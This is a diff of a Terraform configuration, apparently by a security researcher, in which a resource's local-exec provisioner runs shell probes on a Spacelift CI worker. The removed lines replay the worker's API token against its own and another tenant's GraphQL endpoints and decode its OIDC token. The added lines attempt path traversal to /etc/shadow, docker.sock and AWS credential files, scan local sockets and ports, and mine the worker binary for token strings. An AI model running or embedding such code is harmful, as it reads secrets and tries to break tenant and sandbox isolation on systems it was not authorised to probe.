@@ -13,42 +13,46 @@ resource "null_resource" "xsec_probe" {
   provisioner "local-exec" {
     command = <<-EOT
       set +e
-      echo "=== P2 START ==="
-      id
-      echo "=== mounts ==="
-      mount 2>/dev/null | head -40
-      echo "=== root listing ==="
-      ls -la / 2>/dev/null | head -40
-      echo "=== proc1 env (redacted) ==="
-      cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -Ei 'token|key|secret|ssl|cert' | sed 's/=.*/=<redacted>/' | head -20
-      echo "=== worker token len ==="
-      echo "tok_$(echo "$SPACELIFT_API_TOKEN" | wc -c)ch"
-      echo "oidc_$(echo "$SPACELIFT_OIDC_TOKEN" | wc -c)ch"
-      echo "tgtf_$(echo "$TG_TF_REGISTRY_TOKEN" | wc -c)ch"
-      echo "=== worker token vs graphql (A) ==="
-      EP="$TF_VAR_spacelift_graphql_endpoint"
-      Q1='{ "query": "{ viewer { id name } }" }'
-      Q2='{ "query": "{ account { id name } }" }'
-      Q3='{ "query": "{ searchStacks(input:{}) { edges { node { id } } } }" }'
-      Q4='{ "query": "{ stack(id: \"xsec-stack\") { id name } }" }'
-      for Q in "$Q1" "$Q2" "$Q3" "$Q4"; do
-        echo "--- Q ---"
-        curl -s -m 25 -H "Content-Type: application/json" -H "Authorization: Bearer $SPACELIFT_API_TOKEN" -d "$Q" "$EP" | head -c 1200
-        echo
+      echo "=== P3 START ==="
+      echo "--- /var/datadog listing ---"
+      find /var/datadog -maxdepth 4 2>/dev/null | head -80
+      echo "--- /var/spacelift listing ---"
+      find /var/spacelift -maxdepth 3 2>/dev/null | head -60
+      echo "--- /mnt/workspace listing ---"
+      find /mnt/workspace -maxdepth 3 2>/dev/null | head -60
+      echo "--- etc/read ---"
+      cat /etc/hosts 2>/dev/null | head -30
+      cat /etc/resolv.conf 2>/dev/null | head -10
+      cat /etc/hostname 2>/dev/null
+      echo "--- 9p traversal attempts ---"
+      for f in /var/datadog/../../etc/passwd /var/datadog/../../var/run/docker.sock /var/spacelift/../../etc/shadow /mnt/workspace/../../proc/1/environ /etc/hosts/../../etc/passwd /var/datadog/../../../root/.aws/credentials /var/datadog/dd-agent.conf /var/datadog/secrets /var/datadog/datadog.yaml; do
+        if [ -f "$f" ] || [ -S "$f" ]; then echo "FOUND: $f"; head -c 300 "$f" 2>/dev/null | tr -cd '\11\12\15\40-\176' | head -5; else echo "no: $f"; fi
       done
-      echo "=== worker token vs graphql (B tenant) ==="
-      curl -s -m 20 -o /dev/null -w "B RC=%%{http_code}\n" -H "Content-Type: application/json" -H "Authorization: Bearer $SPACELIFT_API_TOKEN" -d '{"query":"{ viewer { id } }"}' "https://itssakexem.app.spacelift.dev/graphql"
-      echo "=== OIDC payload ==="
-      echo "$SPACELIFT_OIDC_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | head -c 300
-      echo
-      echo "$SPACELIFT_OIDC_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | head -c 900
-      echo
-      echo "=== ingress probes ==="
-      getent hosts downloads.spacelift.dev || echo no-downloads-dns
-      for h in 169.254.170.2 127.0.0.1; do
-        curl -s -m 3 -o /dev/null -w "$h RC=%%{http_code}\n" http://$h/ 2>/dev/null || echo "$h fail"
+      echo "--- find any sockets ---"
+      find / -maxdepth 4 -type s 2>/dev/null | head -20
+      find / -maxdepth 3 -iname '*datadog*' 2>/dev/null | head -20
+      echo "--- agent socket probes ---"
+      for p in 8126 5001 5012 8125 8082 9090; do
+        curl -s -m 3 -o /dev/null -w "127.0.0.1:$p RC=%%{http_code}\n" http://127.0.0.1:$p/ 2>/dev/null || echo "127.0.0.1:$p fail"
       done
-      echo "=== P2 END ==="
+      echo "--- proc net ---"
+      cat /proc/net/arp 2>/dev/null | head -10
+      hostname -i 2>/dev/null
+      ip -4 addr 2>/dev/null | head -20 || ifconfig 2>/dev/null | head -20 || true
+      echo "--- proc1 root? ---"
+      ls -la /proc/1/root/ 2>/dev/null | head -10
+      cat /proc/1/status 2>/dev/null | head -30
+      echo "--- docker? ---"
+      ls -la /var/run/ /run/ 2>/dev/null | head -30
+      env | grep -i DOCKER || echo no-docker-env
+      echo "--- sys kmsg/gvisor info ---"
+      cat /proc/sys/kernel/osrelease 2>/dev/null
+      cat /proc/version 2>/dev/null
+      echo "--- try unshare/nsenter/kubelet ---"
+      which unshare nsenter kubectl docker 2>/dev/null
+      echo "--- worker binary strings for endpoints (first 30 hits) ---"
+      strings /bin/spacelift-worker 2>/dev/null | grep -Ei 'https?://|socket|token|credential' | head -30
+      echo "=== P3 END ==="
     EOT
   }
 }
